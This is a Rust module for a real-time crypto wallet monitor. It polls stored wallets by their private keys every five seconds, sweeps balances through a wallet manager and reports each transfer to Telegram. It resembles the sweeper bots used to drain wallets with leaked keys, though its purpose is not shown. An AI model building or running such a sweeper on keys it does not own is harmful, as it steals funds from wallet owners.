use crate::config::Config;
use crate::database::ops::DatabaseOps;
use crate::telegram::alerts::TelegramAlerts;
use crate::wallet::manager::WalletManager;
use std::sync::Arc;
use std::time::Duration;
use tokio::time::sleep;
use futures::stream::{self, StreamExt};
use tracing::{info, warn};

pub struct RealtimeMonitor {
    config: Arc<Config>,
    db_ops: Arc<DatabaseOps>,
    telegram: Arc<TelegramAlerts>,
    wallet_manager: Arc<WalletManager>,
}

impl RealtimeMonitor {
    pub fn new(
        config: Arc<Config>,
        db_ops: Arc<DatabaseOps>,
        telegram: Arc<TelegramAlerts>,
        wallet_manager: Arc<WalletManager>,
    ) -> Arc<Self> {
        Arc::new(Self {
            config,
            db_ops,
            telegram,
            wallet_manager,
        })
    }
    
    // Main monitor loop
    pub async fn run(self: Arc<Self>) {
        info!("🔄 Realtime monitor started");
        
        loop {
            match self.check_all_wallets_parallel().await {
                Ok(count) => {
                    if count > 0 {
                        info!("✅ Checked {} wallets", count);
                    }
                }
                Err(e) => {
                    warn!("❌ Monitor error: {}", e);
                }
            }
            
            // Check every 5 seconds
            sleep(Duration::from_secs(5)).await;
        }
    }
    
    // Parallel wallet check (fast)
    async fn check_all_wallets_parallel(&self) -> Result<usize, Box<dyn std::error::Error>> {
        let wallets = self.db_ops.get_monitoring_wallets().await?;
        
        if wallets.is_empty() {
            return Ok(0);
        }
        
        let total = wallets.len();
        
        // Parallel process with buffer_unordered
        let results = stream::iter(wallets)
            .map(|wallet| {
                let wallet_manager = self.wallet_manager.clone();
                let db_ops = self.db_ops.clone();
                let telegram = self.telegram.clone();
                
                async move {
                    process_single_wallet(
                        wallet_manager,
                        db_ops,
                        telegram,
                        wallet,
                    ).await
                }
            })
            .buffer_unordered(50)
            .collect::<Vec<_>>()
            .await;
        
        Ok(total)
    }
}

async fn process_single_wallet(
    wallet_manager: Arc<WalletManager>,
    db_ops: Arc<DatabaseOps>,
    telegram: Arc<TelegramAlerts>,
    wallet: crate::database::models::MonitoredWalletDoc,
) {
    let address = wallet.address.clone();
    let private_key = wallet.private_key.clone();
    
    match wallet_manager.process_private_key(&private_key).await {
        Ok((wallet_info, transfer_result)) => {
            // Update last checked
            let _ = db_ops.update_last_checked(&address, &wallet_info.balance).await;
            
            // If transfer happened
            if let Some(transfer) = transfer_result {
                if transfer.success {
                    telegram.send_transfer_success(&wallet_info, &transfer).await;
                    
                    let _ = db_ops.update_wallet_after_sweep(
                        &address,
                        &transfer.tx_hash,
                        &transfer.amount,
                    ).await;
                } else {
                    // Transfer failed — don't retry immediately
                    // Next check will happen in 5 seconds anyway
                    if let Some(error) = &transfer.error {
                        telegram.send_transfer_failed(&wallet_info, error).await;
                    }
                }
            }
        }
        Err(e) => {
            warn!("Failed to process wallet {}: {}", address, e);
        }
    }
}